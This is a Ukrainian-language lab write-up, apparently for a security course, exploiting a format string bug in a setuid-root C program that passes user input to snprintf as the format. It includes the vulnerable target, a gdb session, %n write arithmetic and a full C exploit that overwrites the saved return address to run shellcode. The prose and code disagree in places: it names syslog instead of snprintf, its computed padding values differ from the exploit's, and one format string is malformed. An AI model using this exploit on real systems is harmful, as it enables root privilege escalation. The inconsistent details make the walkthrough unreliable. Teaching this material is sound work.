# Format string

Загальний клас уразливості рядка формату це тип вразливості може з’явитися, якщо два різні типи інформаційних каналів об’єднані в один, а спеціальні символи екранування або послідовності використовуються для розрізнення того, який канал наразі активний. Найчастіше один канал є каналом даних, який не аналізується активно, а просто копіюється, тоді як інший канал є контрольним каналом. Хоча це не погана річ сама по собі, вона може швидко стати жахливою проблемою безпеки, якщо зловмисник зможе подати вхід, який використовується в одному каналі. Часто трапляються несправні процедури виходу або виходу з режиму втечі, або вони контролюють рівень, наприклад, уразливості рядків формату. Отже, якщо коротко: проблеми з каналуванням - це не прогалини в безпеці, але вони роблять помилки придатними для використання.

Розглянемо /proj1/targets/target5.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
 


int foo(char *arg)
{
  char buf[400];
  snprintf(buf, sizeof buf, arg);
  return 0;
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target5: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv[1]);
  return 0;
}
```

Тут уразливість полягає у другому параметрі функції syslog. Рядок формату частково надається користувачами. Надаючи рядок формату, ми можемо контролювати поведінку функції форматування.

Якщо отриманий рядок буде довшим за 399 символів, решта символів відкидаються і не зберігаються. Отже, функція перевіряє довжину вхідного аргумента, тому звичайне переповнення буфера неможливе.

Слід зауважити, що функція snprintf приймає на вхід аргумент у вигляді рядка і безпосередньо копіює у буфер, не перевіряючи вміст, адже у ній не задано специфікатора формату, а тому будь-який із них, що скопіюється у рядок, буде мати функцію керуючого символу.

Отже, можна у якості аргумента використати спеціальний символ %n, що здійснює запис за вказівником, переданим у якості аргумента, кількості символів, записаних на момент появи командної послідовності, яка містить n у довільну адресу.

_&lt;будь-який байт&gt;&lt;%08x&gt;+&lt;%n&gt; повинен бути в snprintf та ефективно перезаписати вміст за адресою на %n кількості вже напечатанних байт. Критична частина правильно вказує число% 08x, щоб вказати стек, який вказав на адресу buf._

_8 говорить, що ви хочете показати 8 цифр 0, до якого потрібно додати префікс 0, а не просто порожні пробіли x, який потрібно надрукувати в малій шістнадцятковій літери._

_Коли snprintf \(\) досягне цієї послідовності %08x, він буде шукати змінні, які відповідають% x у стеку. Однак, оскільки там немає змінних, це просто перемістить внутрішній покажчик функції вниз по стеку. Мета полягає в тому, щоб розмістити цю точку в просторі над буфером, де друкується наш рядок._

_Наступний шматок рядка використовує модифікатор %n. Коли snprintf \(\) бачить %n, він шукає наступну змінну в стеці і записує на вказану адресу._

```bash
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
    char buf[400];
      int i;
      int addr;
      char * fmt_str;

      addr = 0xaaaaaaaa;
      fmt_str = "%08x%n";
      for(i = 0; i < 400; i++) {
        if(i < 4) {
          *(buf + i) = addr >> (i * 8); // <address>
        } else if(i < (399 - strlen(fmt_str))) {
          *(buf + i) = 'a'; // <any byte>
        } else if(i < 399) {
          memcpy(buf + i, fmt_str, strlen(fmt_str)); // <format string>
          i += strlen(fmt_str) - 1;
        } else {
          *(buf + i) = '\x00'; // terminate with null
        }
      }

  char *args[] = { TARGET, buf, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
gdb -e sploit5 -s /tmp/target5
(gdb) catch exec
(gdb) r
(gdb) b foo
(gdb) c
Continuing.

Breakpoint 2, foo (arg=0xbffffe5f "\252\252\252\252", 'a' <repeats 196 times>...) at target5.c:9
9     snprintf(buf, sizeof buf, arg);
(gdb) x arg
0xbffffe5f: 0xaaaaaaaa
(gdb) b snprintf
(gdb) c
(gdb) info frame
...

    eip at 0xbffffb3c
```

_Отже це arg=0xbffffe5f це адресса где лежить формат. Далі рядок займає 400 байт після цієї адреси. eip в snprintf - 0xbffffb3c._

_Тож, можна перевизначити адресу, куди здійсниться вихід із функції, на адресу з діапазону, що належить аргументу і вміст якого можна контролювати \(потенційно записати у це місце шеллкод\). Отже, необхідно переписати 4 байти значення, що зберігається у eip._

_Це можна зробити використавши специфікатор %n. Можна сформувати рядок сплойта довжиною 400 байт таким чином, щоб у початку містився форматний рядок, а останні 45 байтів займав шелл код._

_Визначивши, що arg починається за адресою 0xbffffe5f, можна розраххувати місце знаходження шеллкоду:_

```text
400 - 45 = 355 = 0x163
0xbffffe5f+0x163=0xbfffffc2
```

\*Тож, форматний рядок виглядатиме наступним чином: %194u%n%61u%n%256u%n%192u%n

_hex\(194\)=c2, hex\(194+61\)=ff, hex\(194+61+256\)=1ff, hex\(194+61+256+192\)=2bf Тепер слід записати адреси байт, які будуть змінюватись: \x3c\xfb\xff\xbf, \x3d\xfb\xff\xbf, \x3e\xfb\xff\xbf, \x3f\xfb\xff\xbf._

_Але оскільки кожен запис десяткового беззнаковго числа %u зсуває адреси на 4 байти, між адресами необхідно додати байти заповнення. Враховуючи, що при цьому на початку форматного рядка буде записано 32 байти, їх необхідно відняти від %194u%n%61u%n%256u%n%192u%n: 194–32=162, 61–32=29, 256–32=224, 192–32=160. Отже, форматний рядок виглядатиме наступним чином: str = “\xff\xff\xff\xff\x3c\xfb\xff\xbf” “\xff\xff\xff\xff\x3d\xfb\xff\xbf” “\xff\xff\xff\xff\x3e\xfb\xff\xbf” “\xff\xff\xff\xff\x3f\xfb\xff\xbf” “162%u%n%29u%n%224u%n%160u%n”;_

```c
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char buf[400];
  char *str;

  str = "\xff\xff\xff\xff\x3c\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3d\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3e\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3f\xfb\xff\xbf"
            "%153u%n%70u%n%256u%n%192u%n";

  memset(buf, 0x90, 399);
  memcpy(buf, str, strlen(str));
  memcpy(buf+399-strlen(shellcode), shellcode, strlen(shellcode));

    char *args[] = { TARGET, buf, NULL };
    char *env[] = { NULL };

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
  }
```

